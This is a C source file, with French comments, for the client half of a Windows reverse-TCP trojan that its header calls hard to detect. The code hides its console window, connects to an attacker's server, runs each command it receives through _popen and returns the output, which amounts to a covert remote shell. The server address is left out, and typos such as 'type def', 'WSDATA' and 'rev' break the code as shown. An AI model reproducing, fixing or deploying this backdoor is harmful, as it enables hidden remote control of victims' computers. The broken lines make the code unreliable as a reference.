//
// client.c
//
// Created by Cécile Bourgeois on 08/11/2020.
//
// Trojan reverse TCP difficilement détectable en langage C
// Partie cliente en C
// Partie serveur en python
//

// --- REMARQUE IMPORTANTE --- //
// Pour éviter les buffer overflow, on devrait préfer le c++ et std::string
// Ici la mémoire est mal gérée

type def int socklen_t;
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h> // utilisation de socket
#define _WIN32_WINNT 0x0500
#include <windows.h>

// Informations du serveur
#define PORT 666
#define SERVER ... // adresse IP du serveur distant / connexion du type reverse
// Donc c'est le client qui se connecte au serveur
// Le client a besoin de connaître l'adresse du serveur

/*
Les problèmes que l'on pourrait régler :
-> chaque commande est exécutée dans un process différent
on a donc pas de continuité dans les commandes (déplacements de
répertoires... etc)
 Contournement : envoyer plusieurs commandes dans un fichier, puis exécuter le script
*/
int main(void)
{
    // On cache la console au lancement
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_MINIMIZE);
    ShowWindow(hWnd, SW_HIDE);

    // Création de l'objet socket
    WSDATA WSAData; // La structure WSADATA contient des informations sur l'implémentation de Windows Sockets
    int erreur = WSAStartup(MAKEWORD(2, 2), &WSAData); // La fonction WSAStartup lance l'utilisation de la DLL Winsock par un processus.
    
    SOCKET sock;
    SOCKADDR_IN sin;
    char buffer[999] = ""; // pas terrible pour les dépassements

    if (!erreur)
    {
        // Création de la socket
        sock = socket(AF_INET, SOCK_STREAM, 0);
        
        // Configuration de la connexion
        sin.sin_addr.s_addr = inet_addr(SERVER);
        sin.sin_family = AF_INET;
        sin.sin_port = htons(PORT);
        
        // Si l'on a réussi à se connecter
        if (connect(sock, (SOCKADDR*)& sin, sizeof(sin)) != SOCKET_ERROR)
        {
            // Tant que la socket est active si on reçoit une requête
            while (rev(sock, buffer, 999, 0) != SOCKET_ERROR)
            {
                FILE* fp;
                char path[999];
                
                // On exécute la commande contenue dans le buffer
                // On utilise _popen plutôt que system afin de récupérer l'output
                fp = _popen(buffer, "r"); // pour lancer un process avec la chaine de caractères envoyée par le serveur pour récuper le stdout

                // On réinitialise le buffer pour renvoyer le résultat
                char buffer[9999] = "";
                while (fgets(path, sizeof(path) - 1, fp) != NULL) // fgets pour récupérer le résultat de retour
                {
                    // On concatène chaque ligne de retour
                    strcat(buffer, path);
                }
                
                // On renvoit le résultat
                send(sock, buffer, strlen(buffer)+1, 0);

                // On ferme le process
                _pclose(fp);
            }
        }
        
        // fermeture de la connexion
        closesocket(sock);
        WSACleanup();
    }
    return 0;
}
